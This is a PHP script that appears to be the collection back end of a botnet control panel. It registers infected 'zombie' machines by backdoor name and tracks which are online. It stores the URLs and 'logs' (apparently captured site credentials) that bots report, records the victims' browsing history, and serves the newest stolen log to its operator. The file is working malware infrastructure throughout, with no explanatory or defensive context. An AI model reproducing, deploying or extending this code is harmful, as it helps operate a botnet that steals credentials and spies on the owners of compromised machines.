<?php
require_once('includes/config.php');
if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['url'] != '' && isset($_GET['zname']) && $_GET['zname'] != '')
{
    $info = $_GET['info'];
    $url_check = $_GET['url'];
    $z_name = $_GET['zname'];

    $insert = $bdd->prepare("INSERT INTO logs_checker(url_site,logs_site,zombie) VALUES(:url_site, :logs_site, :zombie)");
    $insert->bindParam(':url_site', $url_check);
    $insert->bindParam(':logs_site', $info);
    $insert->bindParam(':zombie', $z_name);
    $insert->execute();
    
    $select = $bdd->prepare('SELECT * FROM bots WHERE name = :name');
    $select->bindParam(':name', $z_name);
    $select->execute();
    $result = $select->fetch();
    if($result['name'] != ''){
        $update = $bdd->prepare("UPDATE bots SET numbers_logs = numbers_logs + 1 WHERE name = :name");
        $update->bindParam(':name', $z_name);
        $update->execute();
    }
}
elseif(isset($_GET['history']) && $_GET['history'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
    $history = $_GET['history'];
    $zombie = $_GET['zombie'];
    $time = date('d-m-Y');
    
    
    $select = $bdd->prepare("SELECT * FROM history_web WHERE website = :website AND zombie = :zombie");
    $select->bindParam(':website', $history);
    $select->bindParam(':zombie', $zombie);
    $select->execute();
    $result = $select->fetch();
    if($result['website'] != ''){
        exit(1);
    }
    
    $insert = $bdd->prepare("INSERT INTO history_web(website, zombie, timevisit) VALUES(:website, :zombie, :time)");
    $insert->bindParam(':website', $history);
    $insert->bindParam(':zombie', $zombie);
    $insert->bindParam(':time', $time);
    $insert->execute();
}
elseif(isset($_GET['last']) && $_GET['last'] != '')
{
    $select_last = $bdd->prepare("SELECT * FROM logs_checker WHERE last = '0' ORDER BY id DESC LIMIT 0,1");
    $select_last->execute();
    
    $fetch = $select_last->fetch();
    if($fetch['id'] != '')
    {
        $end = "Url : ".$fetch['url_site']."\nLogs : ".$fetch['logs_site'];

        $update = $bdd->prepare("UPDATE logs_checker SET last = '1' WHERE id = :id");
        $id = $fetch['id'];
        $update->bindParam(':id', $id);
        $update->execute();
        echo $end;
    }
}
elseif(isset($_GET['add']) && $_GET['add'] != '' && isset($_GET['version']) && $_GET['version'] != '')
{
    $zombie_name = $_GET['add'];
    $backdoor_name = $_GET['version'];
    $check = $bdd->prepare("SELECT * FROM bots WHERE name = :name");
    $check->bindParam(':name', $zombie_name);
    $check->execute();
    $result = $check->fetch();
    if($result['name'] == ''){
        $insert = $bdd->prepare("INSERT INTO bots(name,backdoor_name) VALUES(:name, :backdoor_name)");
        $insert->bindParam(':name', $zombie_name);
        $insert->bindParam(':backdoor_name', $backdoor_name);
        $insert->execute();
    }
}
elseif(isset($_GET['online']) && $_GET['online'] != ''){
    echo "ok";
    $zombie = $_GET['online'];
    $online = $bdd->prepare("UPDATE bots SET online = '1' WHERE name = :name");
    $online->bindParam(':name', $zombie);
    $online->execute();
    echo "ok";
}
?>